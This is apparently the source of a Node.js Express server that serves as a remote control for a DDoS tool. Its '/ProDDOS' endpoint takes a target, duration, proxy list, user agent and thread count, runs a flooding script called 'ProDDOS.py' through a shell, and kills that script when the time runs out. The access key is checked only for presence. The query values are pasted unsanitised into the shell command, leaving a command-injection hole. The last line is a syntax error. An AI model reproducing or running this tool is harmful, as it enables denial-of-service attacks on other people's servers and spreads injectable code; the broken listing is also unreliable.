const express = require('express');
const app = express();
const kill = require('tree-kill');

app.get('/ProDDOS', (req, res) => {
    var query = require('url').parse(req.url, true).query;
    var key = query.key;
    var target = query.target;
    var time = query.time;
    var proxy = query.proxy;
    var ua = query.ua;
    var th = query.threads;

    if (!key) {
        res.status(400).send('Invalid Arguments! [1]')
        return;
    }
    if (!target) {
        res.status(400).send('Invalid Arguments! [2]');
        return;
    }
    if (!time) {
        res.status(400).send('Invalid Arguments! [3]');
        return;
    }
    if (!proxy) {
        res.status(400).send('Invalid Arguments! [4]');
        return;
    }
    if (!ua) {
        res.status(400).send('Invalid Arguments! [5]');
        return;
    }
    if (!th) {
        res.status(400).send('Invalid Arguments! [6]');
        return;
    }

    const urll = new URL(req.protocol + '://' + req.get('host') + req.originalUrl);
    var getkey = urll.searchParams.get('key')
    var gettarget = urll.searchParams.get('target');
    var gettime = urll.searchParams.get('time')
    var getproxy = urll.searchParams.get('proxy')
    var getua = urll.searchParams.get('ua')
    var getth = urll.searchParams.get('threads')

    var exec = require('child_process').exec;

    const attackx = exec(`py ProDDOS.py  ${gettarget} ${gettime} ${getproxy} ${getua} ${getth}`, function (err, stdout) { console.log('Done!') });

    setTimeout(() => {
        kill(attackx.pid);
        console.log(`Killed ${attackx.pid}`)
    }, gettime * 1000) // you might ask why i didnt put timer in DDOS script my anwser is for Full Power i deleted ALL not-needed code from DDOS script so it can RUN in full power 
});

app.listen(3000, ());
